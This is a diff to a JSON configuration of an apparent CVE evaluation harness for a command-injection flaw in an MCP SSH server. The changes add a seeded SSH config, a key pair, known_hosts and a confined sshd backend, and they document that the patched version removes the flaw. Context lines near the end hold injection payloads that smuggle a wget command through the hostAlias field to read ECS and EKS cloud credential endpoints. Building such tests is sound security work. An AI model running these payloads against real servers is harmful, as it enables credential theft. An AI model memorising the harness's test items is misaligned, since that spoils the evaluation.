@@ -145222,7 +145222,20 @@
             "route_checked": false
           }
         ],
-        "launch_options": [],
+        "launch_options": [
+          {
+            "option": "planting_host.has_network",
+            "value": "true",
+            "reason": "The server's ssh and scp reach the launch's OpenSSH sshd over the network: the planting layer creates the launch's closed network for the namespace holder, and the builder (mcp_ssh_injection_env) connects the holder to the sshd's own closed network, which Docker refuses for a container on `none`. Both networks are closed (internal, isolated gateway), so the launch reaches neither the host, its local network nor the Internet (ADR 034). Not a flaw requirement: the exploits run their reads in the server's own container.",
+            "documentation": "evals/cve/backends/mcp_ssh_holdout.py: mcp_ssh_injection_env refuses a planting host with no network; evals/cve/closed_network.py creates both networks."
+          },
+          {
+            "option": "builder",
+            "value": "mcp_ssh_injection_env",
+            "reason": "The launch of command_injection_env (the layout, the planting, the confinement), with an sshd of evals/cve/backends/mcp_ssh_sshd.py stood for the launch and the client's known_hosts mounted, so the remote the README sets up is there when the server's tools call ssh and scp.",
+            "documentation": "evals/cve/backends/mcp_ssh_holdout.py, evals/cve/backends/mcp_ssh_sshd.py (stood_sshd)."
+          }
+        ],
         "seeded_in_layout": [],
         "seeded_outside_layout": [
           {
@@ -145254,6 +145267,88 @@
             "reason": "Installed alongside wget to provide the system TLS root bundle (the https download of the OpenSSH tarball at build); a standard base dependency, used by no server tool by default.",
             "returned_by": [],
             "used_by_default_by": []
+          },
+          {
+            "item": "~/.ssh/config at /tmp/.ssh/config in both images: the README's section 6 'Multiple Keys for Different Servers' production entry (Host production, Hostname prod.example.com, User deploy, IdentityFile ~/.ssh/id_production, IdentitiesOnly yes), its text identical at 1.0.3, 1.0.4 and 1.3.5 (read on 2026-11-13); the staging entry is left out, its host having no backend. Root-owned, mode 0644, the directory /tmp/.ssh root-owned 0755",
+            "reason": "The README's sample, so the server's ssh reaches a remote as its documentation sets one up and listKnownHosts lists a host. Root-owned and mode 0644, a departure from section 4 (which sets 600 on the key, 644 on the configuration, 700 on the directory, all owned by the user): the launch runs the server under an account named after a nonce and the layout check's reference arm under 65534, so a file owned by one of them is unreadable by the other, and OpenSSH refuses a user configuration owned by neither root nor the caller. The content still comes from the README. It holds no nonce and is no kept place",
+            "returned_by": [
+              "listKnownHosts"
+            ],
+            "used_by_default_by": [
+              "listKnownHosts",
+              "runRemoteCommand",
+              "checkConnectivity",
+              "uploadFile",
+              "downloadFile",
+              "runCommandBatch"
+            ]
+          },
+          {
+            "item": "The id_production ed25519 key pair at /tmp/.ssh/id_production and /tmp/.ssh/id_production.pub in both images, made once by the README's `ssh-keygen -t ed25519 -f ~/.ssh/id_production -C \"production-server\"` (section 6) with the empty passphrase of section 1 and baked as text, the same pair the nuisance suite's images carry. Root-owned, mode 0644",
+            "reason": "The key the configuration names, whose public half the sshd authorizes for deploy. Mode 0644 where section 4 sets 600 (the same departure as the configuration): OpenSSH checks a private key's mode only when the caller owns it, so a root-owned key reads under any account. Its path lies outside the kept ssh-private-key paths (id_rsa, id_ed25519). It holds no nonce",
+            "returned_by": [],
+            "used_by_default_by": [
+              "runRemoteCommand",
+              "checkConnectivity",
+              "uploadFile",
+              "downloadFile",
+              "runCommandBatch"
+            ]
+          },
+          {
+            "item": "~/.ssh/known_hosts at /tmp/.ssh/known_hosts, mounted read-only per launch: the launch's sshd host keys under prod.example.com, read with ssh-keyscan once the sshd listens, written to a host file of mode 0644 handed to root by a short-lived container of the pinned busybox (--cap-drop ALL --cap-add CHOWN, no network)",
+            "reason": "As the README's section 5 connection test, run before using the server, writes it on first connection; the README's Requirements name ~/.ssh/known_hosts. 1.0.3 and 1.0.4 call ssh with no host-key option, so without it ssh fails on host key verification. Root-owned and mode 0644 for the reason the configuration is. It carries no nonce and no value taken from the machine",
+            "returned_by": [],
+            "used_by_default_by": [
+              "listKnownHosts",
+              "runRemoteCommand",
+              "checkConnectivity",
+              "uploadFile",
+              "downloadFile",
+              "runCommandBatch"
+            ]
+          },
+          {
+            "item": "uid 65534's passwd home set to /tmp in both images (/etc/passwd's nobody line)",
+            "reason": "OpenSSH resolves ~ from the passwd home, so the layout check's reference arm, which runs under 65534 with HOME=/tmp, reads the configuration where the server looks; the planted account's home is already /tmp. A standard image adjustment that holds no nonce",
+            "returned_by": [],
+            "used_by_default_by": [
+              "runRemoteCommand",
+              "checkConnectivity",
+              "uploadFile",
+              "downloadFile",
+              "runCommandBatch"
+            ]
+          },
+          {
+            "item": "OpenSSH sshd container (image mcp-auditor-cve-mcp-ssh-sshd, evals/docker/Dockerfile.mcp-ssh-sshd): OpenSSH 10.6p2 built from the portable tarball, stood for each launch by evals/cve/backends/mcp_ssh_sshd.py (stood_sshd) under the network alias prod.example.com on port 22, with the account deploy holding the public half of id_production in .ssh/authorized_keys and the README's section 3 server lines on top of the release's default sshd_config, which keeps the sftp subsystem scp uses. It runs as deploy under the suite's confinement (--cap-drop ALL, --security-opt no-new-privileges, --pids-limit 256) with no capability added, binding port 22 since a container's own network namespace sets net.ipv4.ip_unprivileged_port_start to 0",
+            "reason": "The real software the server's ssh and scp reach: the README's sections 2 to 6 set up a remote OpenSSH server for the client entry. It runs in its own network namespace, never in the namespace holder, whose loopback carries the link-local sentinels, so a remote shell reaches none of them; on its own network it reaches nothing of the target. It holds no nonce and surfaces none. Limit: with a working remote, uploadFile of a standard path followed by runRemoteCommand surfaces a kept file through declared functions, on both versions, so the replay strikes any such credit",
+            "returned_by": [
+              "runRemoteCommand",
+              "checkConnectivity",
+              "uploadFile",
+              "downloadFile",
+              "runCommandBatch"
+            ],
+            "used_by_default_by": [
+              "runRemoteCommand",
+              "checkConnectivity",
+              "uploadFile",
+              "downloadFile",
+              "runCommandBatch"
+            ]
+          },
+          {
+            "item": "The sshd's closed network mcp-auditor-cve-mcp-ssh-net-<random hex> (created through evals/cve/closed_network.py: internal, isolated gateway, label mcp-auditor-cve), joined by the sshd under its alias and connected to the namespace holder, whose network namespace the target shares",
+            "reason": "Lets the server's ssh resolve prod.example.com and reach the sshd while the sshd stays out of the holder's namespace. Closed, so neither the target nor the sshd reaches the host, its local network or the Internet (ADR 034). The network's name is not visible inside the container",
+            "returned_by": [],
+            "used_by_default_by": [
+              "runRemoteCommand",
+              "checkConnectivity",
+              "uploadFile",
+              "downloadFile",
+              "runCommandBatch"
+            ]
           }
         ],
         "stand_ins": [],
@@ -145263,6 +145358,12 @@
             "release": "OpenSSH 10.6p1",
             "day": "2026-11-05",
             "source": "The mcp-ssh README (Requirements) names the client and no channel or version: 'SSH client installed (`ssh` and `scp` commands available)'. With no channel named, the release is the latest the OpenSSH project published on the calibration day 2026-11-05: OpenSSH 10.6 / portable 10.6p1, released 2026-10-06 (openssh.com/releasenotes.html; 10.6p2 came out later on 2026-11-05, after the card was written). The image builds the client from https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-10.6p1.tar.gz , checked against the release notes' SHA256 (base64 qdyVZd/+hkD2TYY80poyvEo9vewFZqf8RMXW7nZ9Xzk=); `ssh -V` -> OpenSSH_10.6p1, OpenSSL 3.0.22."
+          },
+          {
+            "software": "OpenSSH server (sshd) [backend]",
+            "release": "OpenSSH 10.6p2",
+            "day": "2026-11-13",
+            "source": "The README names no server software (its section 3 configures an OpenSSH sshd), so the OpenSSH release current on 2026-11-13 is used: 10.6p2 (released 2026-11-05, openssh.org/releasenotes.html, read that day), built from the portable tarball checked against the release notes' SHA256 (base64 muRIcgkM8vBrPPn/FH5/FvMJZxNAdj7S+ZJIOYrinVs=), evals/docker/Dockerfile.mcp-ssh-sshd, the image the nuisance suite's run and fix checks stand. The holdout client stays OpenSSH 10.6p1."
           }
         ],
         "fallback_scope": null,
@@ -145294,7 +145395,7 @@
           "[ecs-task-credentials] runRemoteCommand(hostAlias='nohost\"; wget -qO- -T 8 http://169.254.170.2/v2/credentials/ ; true #', command='echo probe')",
           "[eks-pod-identity] runRemoteCommand(hostAlias='nohost\"; wget -qO- -T 8 http://169.254.170.23/v1/credentials ; true #', command='echo probe')"
         ],
-        "benign_call": "listKnownHosts({}) -> reads ~/.ssh/config (absent under HOME=/tmp), returns []; no breakout, no nonce, not aimed, clean on both versions.",
+        "benign_call": "listKnownHosts({}) -> reads ~/.ssh/config and ~/.ssh/known_hosts under HOME=/tmp and returns the seeded production entry (hostname prod.example.com, user deploy, identityFile ~/.ssh/id_production); no breakout, no nonce, not aimed, clean on both versions.",
         "patched_result": "On 1.0.4 runRemoteCommand/uploadFile/downloadFile call child_process.execFile('ssh'|'scp', [hostAlias, ...]) with no shell, so every injection payload is passed as a single literal ssh hostname argument. ssh fails to resolve it and no shell metacharacter is interpreted; none of the 25 kept nonces surface and the benign listKnownHosts call returns normally (no error). The flaw is gone.",
         "attempts": 1
       },
